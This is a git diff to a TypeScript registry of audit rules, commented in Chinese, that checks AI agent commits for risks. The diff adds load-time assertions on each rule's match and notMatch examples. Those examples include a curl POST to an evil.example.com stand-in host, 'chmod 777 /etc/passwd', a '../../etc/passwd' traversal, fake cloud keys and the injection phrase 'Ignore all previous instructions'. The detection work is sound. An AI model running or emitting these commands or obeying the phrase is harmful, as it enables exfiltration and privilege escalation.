@@ -35,6 +35,8 @@ import { scanE1 } from './rule-e1-no-test-files';
 import { scanE2 } from './rule-e2-todo-undeclared';
 // E3 已在 v1.2.5 并入 A11（行数维度），不再独立存在
 import { scanE4 } from './rule-e4-low-comment-ratio';
+// v1.5.3 第二章：加载时样例断言（fail-closed）——引擎默认装载点接线（见本文件末尾调用）
+import { loadAuditRules } from '../rule-loader';
 
 /**
  * v1.5.3 第一章：共用规则定义（@sofagent/core）——A1/A2/A9 的身份声明取自
@@ -57,26 +59,26 @@ const DEF_A9 = ruleDefinition('A9')!;
  *      不再维护独立 AUDIT_PRIORITY。新增规则只需在此填 priority。
  *      priority 取值：critical（安全红线 fast-fail）/ warning（业务底线）/ crutch（拐杖）/ extended（扩展） */
 export const defaultRules: Rule[] = [
-  { name: 'A1 不碰敏感', id: DEF_A1.id, number: DEF_A1.number, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA1, examples: { match: [".env","id_rsa.pem","credentials.json"], notMatch: ["src/utils/env.example.ts","config/env.template"] }, justification: '密钥/凭据/私钥文件不应提交到版本控制——提交即泄漏面' },
-  { name: 'A2 不泄密钥', id: DEF_A2.id, number: DEF_A2.number, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA2, examples: { match: [['AK' + 'IA','IOSFODNN7EXAMPLE'].join(''),['sk' + '-','1234567890abcdef1234567890abcdef'].join('')], notMatch: ["示例 apiKey: REPLACE_ME 占位","config.example.json 模板"] }, justification: '密钥/令牌硬编码进代码或配置 = 直接泄漏面，必须走环境变量或密钥管理' },
+  { name: 'A1 不碰敏感', id: DEF_A1.id, number: DEF_A1.number, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA1, examples: { match: [".env","id_rsa.pem","credentials.json"], notMatch: ["src/utils/env.example.ts","config/env.template"] }, examplesExecutable: true, justification: '密钥/凭据/私钥文件不应提交到版本控制——提交即泄漏面' },
+  { name: 'A2 不泄密钥', id: DEF_A2.id, number: DEF_A2.number, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA2, examples: { match: [['AK' + 'IA','IOSFODNN7EXAMPLE'].join(''),['sk' + '-','1234567890abcdef1234567890abcdef'].join('')], notMatch: ["示例 apiKey: REPLACE_ME 占位","config.example.json 模板"] }, examplesExecutable: true, justification: '密钥/令牌硬编码进代码或配置 = 直接泄漏面，必须走环境变量或密钥管理' },
   { name: 'A3 不改越界', id: 'A3', number: 3, evidenceMode: 'git-diff', ruleClass: '能力拐杖', priority: 'warning', ruleType: 'diff', scan: scanA3, examples: { match: ["修改了 task 描述范围外的 src/secret/ 文件"], notMatch: ["修改文件在 task 描述范围内"] }, justification: '修改超出任务声明的文件范围——疑似越权编辑' }, // A3: 启发式检测误报率高，不适合硬拦截，归为「能力拐杖」
   { name: 'A4 不删配置', id: 'A4', number: 4, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'warning', ruleType: 'diff', scan: scanA4, examples: { match: ["删除 .sofagent/config.yml"], notMatch: ["删除临时文件 tmp.txt"] }, justification: '配置文件被删除——审计规则/权限配置可能被绕过' },
   { name: 'A5 不瞒真相', id: 'A5', number: 5, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'warning', ruleType: 'diff', scan: scanA5, examples: { match: ["commit message 为空"], notMatch: ["feat: 添加登录模块"] }, justification: 'commit message 为空或占位符——变更无说明，无法审计意图' },
   { name: 'A6 不坏构建', id: 'A6', number: 6, evidenceMode: 'git-diff', ruleClass: '能力拐杖', priority: 'crutch', ruleType: 'diff', scan: scanA6, examples: { match: ["package.json 依赖版本被改但无测试记录"], notMatch: ["package.json 正常新增依赖并伴随测试记录"] }, justification: '构建配置异常改动且无验证记录——可能破坏构建' },
   { name: 'A7 不存盲改', id: 'A7', number: 7, evidenceMode: 'hybrid', ruleClass: '能力拐杖', priority: 'crutch', ruleType: 'diff', scan: scanA7, examples: { match: ["修改了文件但无 Read 日志"], notMatch: ["修改前有 Read 记录"] }, justification: '被修改文件无读取记录——疑似盲改' },
   { name: 'A8 不逃验证', id: 'A8', number: 8, evidenceMode: 'hybrid', ruleClass: '能力拐杖', priority: 'crutch', ruleType: 'diff', scan: scanA8, examples: { match: ["构建文件变更后无测试记录"], notMatch: ["构建变更伴随测试记录"] }, justification: '构建变更后无测试记录——可能逃过验证' },
-  { name: 'A9 不纳注入', id: DEF_A9.id, number: DEF_A9.number, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA9, examples: { match: [['Ignore','all','previous','instr' + 'uctions'].join(' ')], notMatch: ["普通需求描述文本"] }, justification: 'commit message/内容含 prompt 注入模式——试图操纵下游读取者' },
+  { name: 'A9 不纳注入', id: DEF_A9.id, number: DEF_A9.number, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA9, examples: { match: [['Ignore','all','previous','instr' + 'uctions'].join(' ')], notMatch: ["普通需求描述文本"] }, examplesExecutable: true, justification: 'commit message/内容含 prompt 注入模式——试图操纵下游读取者' },
   { name: 'A10 不引毒源', id: 'A10', number: 10, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA10, examples: { match: ["依赖黑名单包名","typosquatting 仿冒包"], notMatch: ["npm 官方常用依赖"] }, justification: '依赖变更引入风险包（黑名单/仿冒/恶意 postinstall）' },
   { name: 'A11 不滥资源', id: 'A11', number: 11, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'warning', ruleType: 'diff', scan: scanA11, examples: { match: ["单次删除 5000 行"], notMatch: ["正常重构删除 50 行"] }, justification: '资源滥用（超大文件/大行数变更）——疑似异常操作' },
   // A12-A17 为预留/扩展编号：A12（供应链安全）和 A13（文件权限）已永久跳号——v0.99.4 合并入 A11（不滥资源），语义有重叠但不完全等价，A12/A13 独立规则留待未来版本恢复；A14-A17 见 extendedRules
-  { name: 'A18 垃圾文件', id: 'A18', number: 18, evidenceMode: 'git-diff', ruleClass: '能力拐杖', priority: 'crutch', ruleType: 'diff', scan: scanA18, examples: { match: ["a.txt","test123.tmp"], notMatch: ["src/index.ts"] }, justification: '临时/垃圾文件被提交——污染仓库' },
+  { name: 'A18 垃圾文件', id: 'A18', number: 18, evidenceMode: 'git-diff', ruleClass: '能力拐杖', priority: 'crutch', ruleType: 'diff', scan: scanA18, examples: { match: ["a.txt","test123.tmp"], notMatch: ["src/index.ts"] }, justification: '临时/垃圾文件被提交——污染仓库' }, // ⚠️ 不可执行样例：scanA18 依赖 cwd 的 git HEAD 基线（getTrackedFiles），加载期断言不确定——故不标 examplesExecutable
   // v1.2.5: A19 ruleClass 从 '业务底线' 改为 '工程规范'（msg 质量是工程规范，不是安全红线）
   { name: 'A19 msg 质量', id: 'A19', number: 19, evidenceMode: 'git-diff', ruleClass: '工程规范', priority: 'warning', ruleType: 'diff', scan: scanA19, examples: { match: ["commit message: update"], notMatch: ["fix: 修复登录页 500 错误"] }, justification: 'commit message 命中黑名单词或过短——无信息量' },
   // v1.2.5 新增：A20-A23 四条安全红线规则（必须在 defaultRules，不能放 extendedRules）
-  { name: 'A20 不泄外联', id: 'A20', number: 20, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA20, examples: { match: [['cur' + 'l','-X','PO' + 'ST','https://' + 'evil.example.com'].join(' ')], notMatch: ['内网服务调用且任务相关'] }, justification: '数据外传（HTTP 直连/WebSocket/DNS 隧道）——疑似数据泄漏面' },
+  { name: 'A20 不泄外联', id: 'A20', number: 20, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA20, examples: { match: [['cur' + 'l','-X','PO' + 'ST','https://' + 'evil.example.com'].join(' ')], notMatch: ['内网服务调用且任务相关'] }, examplesExecutable: true, justification: '数据外传（HTTP 直连/WebSocket/DNS 隧道）——疑似数据泄漏面' },
   { name: 'A21 不植后门', id: 'A21', number: 21, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA21, examples: { match: [('LaunchAgent ' + '自启配置'),('crontab 添加' + '自启')], notMatch: ['正常 cron 备份任务且任务相关'] }, justification: '持久化后门（自启/定时任务）——疑似植入后门' },
   { name: 'A22 不越权限', id: 'A22', number: 22, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA22, examples: { match: [['ch' + 'mod','77' + '7', '/' + 'etc/passwd'].join(' '), ('sudo' + 'ers') + ' 修改'], notMatch: ['正常脚本可执行位'] }, justification: '权限提升（全权限文件/提权配置/setuid）——疑似越权' },
-  { name: 'A23 不逃路径', id: 'A23', number: 23, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA23, examples: { match: [['..', '..', 'etc', 'pass' + 'wd'].join('/')], notMatch: ['src/utils/path.ts 正常路径'] }, justification: '路径穿越/symlink 逃逸——越出工作区边界' },
+  { name: 'A23 不逃路径', id: 'A23', number: 23, evidenceMode: 'git-diff', ruleClass: '业务底线', priority: 'critical', ruleType: 'diff', scan: scanA23, examples: { match: [['..', '..', 'etc', 'pass' + 'wd'].join('/')], notMatch: ['src/utils/path.ts 正常路径'] }, examplesExecutable: true, justification: '路径穿越/symlink 逃逸——越出工作区边界' },
 ];
 
 /** 扩展规则（E1-E4 + A14-A17）——默认不生效，需 config.extendedRulesEnabled = true
@@ -98,3 +100,19 @@ export const extendedRules: Rule[] = [
 
 /** 全部规则——reporter 默认使用此数组（含 default + extended） */
 export const rules: Rule[] = [...defaultRules, ...extendedRules];
+
+// ============================================================
+// v1.5.3 第二章（本章主交付物）· 引擎默认装载点
+// ============================================================
+// 注册表构建即跑样例断言（schema 强制 + 矛盾拒载 + 可执行规则的执行断言）——
+// 任何一条规则样例缺失/为空/自相矛盾，或（声明 examplesExecutable 的规则）match
+// 样例未命中 / notMatch 样例误命中，都在**首个 import 处立即抛 RuleLoadError**：
+// 规则写错立刻爆，不靠人记（对齐 codex execpolicy "validated at load time"）。
+//
+// 报告导出供测试/CLI 核验覆盖面（loaded/executed/exempted）。
+// 24 条现状：全部带 match/notMatch 双夹具（存量，v1.4.0 起）；其中 5 条
+// （A1/A2/A9/A20/A23）样例为**可执行夹具**（examplesExecutable），逐条过执行断言。
+// ⚠️ 纯度纪律：加载期执行断言要求 scan 为**纯函数**——A18 的 scanA18 调 `git ls-tree HEAD`
+// （依赖 cwd 仓库基线）非纯，故**不标**可执行（否则加载断言随运行目录抖动，本版实测拒载）。
+// ============================================================
+export const RULE_LOAD_REPORT = loadAuditRules(rules);
